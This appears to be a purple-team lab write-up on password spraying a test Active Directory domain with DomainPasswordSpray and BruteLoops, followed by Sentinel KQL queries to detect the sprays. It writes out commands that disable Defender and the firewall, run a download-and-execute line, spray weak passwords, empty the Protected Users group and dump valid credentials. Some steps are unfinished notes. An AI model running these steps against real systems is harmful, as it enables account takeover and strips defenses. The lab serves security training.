This lab covers the use of BruteLoops, DomainPasswordSpray, and discusses additional tooling for testing password strength from an adversary's perspective.

# Objectives
* Identify potenital password spray attacks  
* Use deception technology to reduce false positives  
* Build a Password Spray Alert
# Methods
To accomplish our lab objectives 
- we will first prepare our lab environment for AV considerations. 
- use DomainPasswordSpray to complete a password spray attack on the network. 
- use BruteLoops to demonstrate an alternate method of password sprays. 
- hunt for the password spray attacks in Sentinel. 
- Lastly, using deception technology we will reduce false positives and create a Sentinel Alert for the password spray attack.
# Which System to Use?
**This lab will switch between all three systems.**

# AV Considerations
First, lets create a Domain Password Policy.

The following PowerShell command sets the following configuration parameters in the domain password policy:

- Domain (Identity): doazlab.com
- How long an account is locked (LockoutDuration): 40 minutes
- How long between unsuccessful auths is login threshold set to 0 (LockoutObservationWindow): 20 minutes
- How many failed authentication events - EID 4625 - before account lockout (LockoutThreshold): 50 failed logins
- Complexity requirements: True
- Reversibly decryptible: False
- Maximum password age: 180 days
- Minimum password age: 1 day
- Minimum password length: 10 characters

The next commands are intended to be ran from the domain controller, or the workstation if you installed RSAT tools for AD.

Run the AV and firewall disable operation on the DC.

```powershell
Set-MpPreference -ExclusionPath 'c:\users\doadmin'
Set-MpPreference -ExclusionProcess "powershell.exe", "cmd.exe"
Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend
```

![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231206005015576.png)

Disable the firewall too.

```powershell
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```

![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231206005037881.png)

Next, set the domain password policy.

```powershell
Set-ADDefaultDomainPasswordPolicy -Identity doazlab.com -LockoutDuration 00:40:00 -LockoutObservationWindow 00:20:00 -LockoutThreshold 50 -ComplexityEnabled $True -ReversibleEncryptionEnabled $False -MaxPasswordAge 180.00:00:00 -MinPasswordAge 1.00:00:00 -MinPasswordLength 10
```

# Attack: DomainPassword Spray
This is the easiest to use password spray tool ever built. Three commands, assuming you are in a PowerShell session with domain context.

This tool is intended to be invoked from the workstation.

```powershell
gpupdate /force
Set-ExecutionPolicy Bypass -Force
IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/DefensiveOrigins/DomainPasswordSpray/master/DomainPasswordSpray.ps1')
Invoke-DomainPasswordSpray -Password "Winter2021!" -Force
```

# Attack: Analysis and Parsing
The [Impacket Tools lab](https://github.com/AppliedPurpleTeaming/APT-9S22/blob/main/APT/1-Labs/L0090-SprayTools/L0080) at L0080 targeted the Active Directory domain and dumped a list of user objects and their password creation timestamp. The output is not pretty and needs cleaned up for use with BruteLoops. Some partial output from the adusers.txt file is shown below.

![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231206021127865.png)

Replay below year if need be
```bash
cd /opt/
cat /opt/adusers.txt | grep -ia 2023 | cut -d " " -f1
```

Your output at this point should be fairly clean. Please note that at this point, you have not formatted the usernames for either SMB or web service attacks.

![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231206021318968.png)

Let's perform a couple more operations to this list.

You should write the cleaned up list to a new file. In the next command, you will create a new file under /opt/ called users.txt using the previous text transformation command and tee.

Again replace year if need be
```
sudo -s
cat /opt/adusers.txt |grep -ia 2023 |cut -d " " -f1 |egrep -vi 'impacket|2023' |tee -a /opt/users.txt
head /opt/users.txt
```

You are going to create two more files from the clean version of users.txt in /opt/. The two outputs are listed in the next bullet points. These formats are very common in use attacking credential-based services.
- **Web service transformation: [username@doazlab.com](mailto:username@doazlab.com)**
- **SMB listener transformation: doazlab.com\username**

```bash
sed s/$/@doazlab.com/ /opt/users.txt > /opt/web-users.txt
head /opt/web-users.txt
```

# Attack: Prepare SMB Password Spray with BruteLoops

[ImpostorKeanu/BruteLoops: Protocol agnostic online password guessing API.](https://github.com/ImpostorKeanu/BruteLoops) - A dead simple library providing the foundational logic for efficient password brute force attacks against authentication interfaces.

Next, we will use BruteLoops to password spray the network using the SMB service.

- TODO - bl-env/bin/activate 
	- activate file doesn't exist
	- run `python3 setup.py install` to load everything in anyway and attempt
```bash
cd /opt/BruteLoops/
source bl-env/bin/activate
python3 bl-dbmanager.py doazlab.db import-spray-values --username-files /opt/smb-users.txt
```

![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231206023334966.png)

Next, create a simple password file with a couple entries.

```bash
echo "Password1!" >> /opt/passwords.txt
echo "Winter2021!" >> /opt/passwords.txt
echo "Winter2022!" >> /opt/passwords.txt
echo "DOLabAdmin1!" >> /opt/passwords.txt
```

![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231206023406183.png)

Populate the database with passwords as listed below.

```bash
python3 bl-dbmanager.py doazlab.db import-spray-values --password-files /opt/passwords.txt
```

![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231206023456480.png)
# Attack: Execute SMB Password Spray with BruteLoops
Once the SQLite3 database was populated with usernames and passwords from the last step, we use the the following command to instantiate the attack.

```bash
python3 bl-example.py doazlab.db -pgc 1 -at 1 -ajmin .2s -ajmax .5s -tjmin 60m -tjmax 65m -lf spray-smb.log smb.smb --server-ip 192.168.2.4
```

**This attack will crash the remote service consistently.**

![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231206022407968.png)

You may catch a valid authentication scrolling by, as shown in the next screenshot. You can leave this running, should you choose. It will stop after the passwords are guessed against each account in the list.

![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231206022404977.png)

You may run into following crash

![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231206022429677.png)

While investigating the SMB service or connection crash, we reviewed both the remote server event logs, shown next. This event channel was unmonitored and would re-present previously captured authentication failures (albeit with some additional details).

![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231206022443280.png)

And, we have importantly uncovered a strong defense. Going back in time to the initial user deployment using BadBlood, some users were mapped to a very important group: **Protected Users**.

The following screenshot includes a capture of BruteLoops running into an account during a spray that was a member of the Protected Users group. Requesting credential validation against accounts in this group will break both BruteLoops and CrackMap password sprays.

![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231206022508443.png)

Run the following command on the domain controller in PowerShell. It will remove all members from the Protected Users group and allow completion of these password sprays.

```powershell
Remove-ADGroupMember "Protected Users" -Members (Get-ADGroupMember "Protected Users") -Confirm:$false
```

![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231206022605016.png)

Switch back over to the BruteLoops env in your Linux terminal. Press the up arrow in your terminal session and hit enter to re-launch the attack. Carry on.

If you still get weird errors, then make sure smb-users file uses forward and not backslashes.

```bash
sed 's/^/doazlab.com\//' /opt/users.txt > /opt/smb-users.txt
head /opt/smb-users.txt
```

```bash
python3 bl-dbmanager.py doazlab.db import-spray-values --username-files /opt/smb-users.txt
```

```bash
sed -i 's/\\/\//g' smb-users.txt > smb-users.txt
```

Execute Attack Command:
```bash
python3 bl-example.py doazlab.db -pgc 1 -at 1 -ajmin .2s -ajmax .5s -tjmin 60m -tjmax 65m -lf spray-smb.log smb.smb --server-ip 192.168.2.4
```

Still getting errors:
- May be issue with not having python3.9 instead?
```bash

sudo add-apt-repository ppa:deadsnakes/ppa
root@Nux01:/opt/BruteLoops# sudo apt install python3.9
Reading package lists... Done
Building dependency tree... Done

```

![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231206031409998.png)

Valid user credentials can then be viewed through the following command.

```bash
python3 bl-dbmanager.py doazlab.db dump-valid
```

![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231206022636116.png)

Ultimately, BruteLoops was designed for a more common attack vector, and in the understanding of the course authors, Office 365. SMB was discovered to be an unstable target for a password spray. The point of the lab was to show off some additional tooling and review the impact on Windows logs through event ID analysis.

# Hunt: Password Spray - Timechart
Let's perform a quick timechart review of the failed logins. Lets use the following KQL query in Sentinel:

The following events are used:

- [4625](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625): An account failed to log on

```
SecurityEvent
| where EventID == 4625
| where TimeGenerated > ago(4h)
| render timechart
```

# KQL Password Spray Detections

```
SecurityEvent
| where EventID == 4624 or EventID == 4625 or EventID == 4776
| where TimeGenerated > ago(4h)
| where Account contains "Heloise.Brinn" or Account contains "luis.graves"
| project Activity, Account, Computer, IpAddress
```

# Time Series Detection
What the heck is going on?

-  Azure is changing up their logging and some things just got shifted.  However, I'm still getting logs.  Not sure if the system is compliant or not

- Time series charts
```
SecurityEvent
| where EventID == 4625
| where TimeGenerated > ago(4h)
| render timechart
```

```
SecurityEvent
| where EventID == 4625
| where FailureReason!="%%2313"
| where TimeGenerated > ago(24h)
| summarize Count = count() by bin(TimeGenerated, 1h)
| render timechart title="Total Authentication Failure Events (Event ID 4625) in the Last 24 Hours"
```

![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231206035746488.png)


What is going on with these?

![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231206040156372.png)

# Trying Another Spray Then Detections

```powershell
Invoke-DomainPasswordSpray -Password "Password1!" -Force
```

![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231206040321134.png)

I don't understand, but okay this is why we use cyber deception.

```
SecurityEvent
| where TimeGenerated >= ago(1d)
| where EventID == 4625
| summarize FailedLogins=count() by Account,Computer
| sort by FailedLogins desc
```

![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231206040819389.png)

```
SecurityEvent
| where TimeGenerated >= ago(1d)
// | where FailureReason!="%%2313"
| where EventID == 4625
| summarize count() by bin(TimeGenerated, 1h)
| render timechart
```

# 14 Day Window
Sat up a lab on Azure without a firewall. I knew I'd be getting scanned a good bit, but not by everybody and their brother🤣💀. Wonder why there's an upward trend too? 🤔
